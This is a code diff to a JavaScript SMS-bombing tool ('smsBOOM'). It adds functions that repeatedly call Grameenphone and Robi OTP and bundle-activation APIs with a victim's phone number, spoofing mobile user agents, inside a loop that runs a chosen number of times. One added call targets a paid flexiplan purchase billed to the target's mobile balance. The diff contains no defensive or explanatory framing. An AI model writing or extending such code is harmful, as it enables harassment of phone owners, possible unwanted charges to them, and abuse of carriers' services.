@@ -256,6 +256,121 @@ async function smsBOOM(number, amount) {
       });
   }
 
+  // https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation
+
+  function gpwebms(no) {
+    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
+    request
+      .post({
+        url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
+        headers: {
+          "User-Agent":
+            "Dalvik/2.1.0 (Linux; U; Android 10; SM-A205F Build/QP1A.190711.020)",
+          "Accept-Language": "en",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          bioscope: 0,
+          bundle_id: 610744,
+          data: 2560,
+          fourg: 0,
+          is_login: false,
+          longevity: 3,
+          mca: 0,
+          msisdn: no,
+          payment_mode: "mobile_balance",
+          price: 83.2,
+          sms: 0,
+          voice: 25,
+        }),
+      })
+      .on("response", function (response) {
+        if (response.statusCode == 200) {
+          dataFSms.sent++;
+          return dataFSms;
+        } else {
+          dataFSms.faild++;
+          return dataFSms;
+        }
+      })
+      .on("error", function (error) {
+        dataFSms.faild++;
+        return dataFSms;
+      });
+  }
+
+  // https://weblogin.grameenphone.com/backend/api/v1/otp
+
+  function weblogin(no) {
+    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
+    request
+      .post({
+        url: "https://weblogin.grameenphone.com/backend/api/v1/otp",
+        headers: {
+          "User-Agent":
+            "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
+          "Accept-Language": "en",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          msisdn: no,
+        }),
+      })
+      .on("response", function (response) {
+        if (response.statusCode == 200) {
+          dataFSms.sent++;
+          console.log(response);
+          return dataFSms;
+        } else {
+          dataFSms.faild++;
+          console.log(response);
+          return dataFSms;
+        }
+      })
+      .on("error", function (error) {
+        dataFSms.faild++;
+        console.log(error);
+        return dataFSms;
+      });
+  }
+
+  // function https://webapi.robi.com.bd/v1/account/login/otp
+
+  function robi(no) {
+    console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
+    request
+      .post({
+        url: "https://webapi.robi.com.bd/v1/account/login/otp",
+        headers: {
+          "User-Agent":
+            "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
+          "Accept-Language": "en",
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          password: "",
+          phone_number: no,
+          redirectTo: null,
+        }),
+      })
+      .on("response", function (response) {
+        if (response.statusCode == 200) {
+          dataFSms.sent++;
+          console.log(response);
+          return dataFSms;
+        } else {
+          dataFSms.faild++;
+          console.log(response);
+          return dataFSms;
+        }
+      })
+      .on("error", function (error) {
+        dataFSms.faild++;
+        console.log(error);
+        return dataFSms;
+      });
+  }
+
   function send(no) {
     console.log(`[SMS] ${no} - ${dataFSms.date}`.green);
     ecuriar(no);
@@ -266,6 +381,9 @@ async function smsBOOM(number, amount) {
     qcoom(no);
     fundesh(no);
     ghoori(no);
+    gpwebms(no);
+    weblogin(no);
+    robi(no);
   }
 
   for (let i = 0; i < amount; i++) {
